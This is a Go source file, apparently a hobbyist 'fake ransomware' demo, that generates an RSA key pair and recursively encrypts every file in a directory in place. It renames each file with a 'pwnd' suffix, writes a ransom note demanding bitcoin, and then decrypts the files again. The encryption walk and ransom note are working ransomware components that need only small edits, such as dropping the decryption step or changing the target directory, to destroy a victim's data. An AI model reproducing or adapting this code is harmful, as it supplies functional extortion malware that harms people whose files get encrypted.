package main

import (
	"encoding/base64"
	"crypto/sha256"
	"crypto/rand"
	"crypto/rsa"
	"strings"
	"fmt"
	"os"
)

func Banner() {
	// A banner for fun
	fmt.Println("	            .         .                                        ")
	fmt.Println("8 8888888888       ,8.       ,8.            d888888o.   8 8888      88 ")
	fmt.Println("8 8888            ,888.     ,888.         .`8888:' `88. 8 8888      88 ")
	fmt.Println("8 8888           .`8888.   .`8888.        8.`8888.   Y8 8 8888      88 ")
	fmt.Println("8 8888          ,8.`8888. ,8.`8888.       `8.`8888.     8 8888      88 ")
	fmt.Println("8 888888888888 ,8'8.`8888,8^8.`8888.       `8.`8888.    8 8888      88 ")
	fmt.Println("8 8888        ,8' `8.`8888' `8.`8888.       `8.`8888.   8 8888      88 ")
	fmt.Println("8 8888       ,8'   `8.`88'   `8.`8888.       `8.`8888.  8 8888      88 ")
	fmt.Println("8 8888      ,8'     `8.`'     `8.`8888.  8b   `8.`8888. ` 8888     ,8P ")
	fmt.Println("8 8888     ,8'       `8        `8.`8888. `8b.  ;8.`8888   8888   ,d8P  ")
	fmt.Println("8 8888    ,8'         `         `8.`8888. `Y8888P ,88P'    `Y88888P'   ")

	fmt.Println("\nFuck.My.Shit.Up. let you fake some ransomware activity, enjoy !")
	fmt.Println("Made By Denis <cr1ng3> REMACLE\n")
}

func WriteFuckYouLetter() {
	var FuckYou []byte

	FuckYou =  append(FuckYou, "Ya Got PWND\n"...)
	FuckYou =  append(FuckYou, "Ya HAVE 24 hours to send us 666 BITCOIN at <Bitcoin wallet address>\n"...)
	FuckYou =  append(FuckYou, "If ya don't i'll never decrypt yer data\n"...)
	os.WriteFile("/Users/denis/FuckYou", FuckYou, 666)
}

func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
	// key generation
	priv_key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		fmt.Println("Could not generate Keys")
		os.Exit(1)
	}
	pub_key := priv_key.PublicKey
	return pub_key, *priv_key
}

func Encryption(to_Encrypt string, pub_key rsa.PublicKey) (string) {
	//Encrypt outgoing data
	data := []byte(to_Encrypt)
	rng := rand.Reader
	hash := sha256.New()
	msgLen := len(to_Encrypt)
    step := pub_key.Size() - 2*hash.Size() - 2
    var ciphertext []byte

    for start := 0; start < msgLen; start += step {
        finish := start + step
        if finish > msgLen {
            finish = msgLen
        }

        cipherblocks, err := rsa.EncryptOAEP(hash, rng, &pub_key, data[start:finish], nil)
        if err != nil {
            fmt.Printf("Error from encryption: %s\n", err)
			return "Encryption error"
        }

        ciphertext = append(ciphertext, cipherblocks...)
    }
	return string(ciphertext)
}

func Decryption(to_Decrypt string, priv_key rsa.PrivateKey) (string) {
	//Decrypt incoming data
	data := []byte(to_Decrypt)
	rng := rand.Reader
	hash := sha256.New()
	msgLen := len(to_Decrypt)
    step := priv_key.Size()
    var plaintext []byte

    for start := 0; start < msgLen; start += step {
        finish := start + step
        if finish > msgLen {
            finish = msgLen
        }

		plainblocks, err := rsa.DecryptOAEP(hash, rng, &priv_key, data[start:finish], nil)
		if err != nil { 
            fmt.Printf("Error from decryption: %s\n", err)
			return string(plainblocks)
		}

        plaintext = append(plaintext, plainblocks...)
    }
	return string(plaintext)
}

func DirectoryNavigationEncryption(directory string, pub_key rsa.PublicKey, priv_key rsa.PrivateKey) {
	directorylist, _ := os.ReadDir(directory)
	os.Chdir(directory)

    for _, entry := range directorylist {
		if !(entry.IsDir()) {
			fmt.Print(entry.Name()+" isn't a directory... ")
			data, _ := os.ReadFile(entry.Name())
			encoded_data := base64.StdEncoding.EncodeToString([]byte(data))
			ciphertext := Encryption(encoded_data, pub_key)
			os.WriteFile(entry.Name(), []byte(ciphertext), 666)
			os.Rename(entry.Name(), entry.Name()+"pwnd")
			fmt.Print("PWNED\n")
		} else {
			DirectoryNavigationEncryption(entry.Name(), pub_key, priv_key)
		}
    }
	os.Chdir("..")
}

func DirectoryNavigationDecryption(directory string, pub_key rsa.PublicKey, priv_key rsa.PrivateKey) {
	directorylist, _ := os.ReadDir(directory)
	os.Chdir(directory)

    for _, entry := range directorylist {
		if !(entry.IsDir()) {
			fmt.Print(entry.Name()+" isn't a directory... ")
			data, _ := os.ReadFile(entry.Name())
			plaintext := Decryption(string(data), priv_key)
			decoded_data, _ := base64.StdEncoding.DecodeString(plaintext)
			os.WriteFile(entry.Name(), []byte(decoded_data), 666)
			os.Rename(entry.Name(), strings.TrimSuffix(entry.Name(), "pwnd"))
			fmt.Print("UNPWNED\n")
		} else {
			DirectoryNavigationDecryption(entry.Name(), pub_key, priv_key)
		}
    }
	os.Chdir("..")
}

func main() {
	Banner()

	pub_key, priv_key := KeyGen()
	fmt.Println("KeyGen done.")
	DirectoryNavigationEncryption("test", pub_key, priv_key)
	fmt.Println("Encryption done.")
	WriteFuckYouLetter()
	fmt.Println("FuckYou letter done.")
	DirectoryNavigationDecryption("test", pub_key, priv_key)
	fmt.Println("Decryption done.")

}
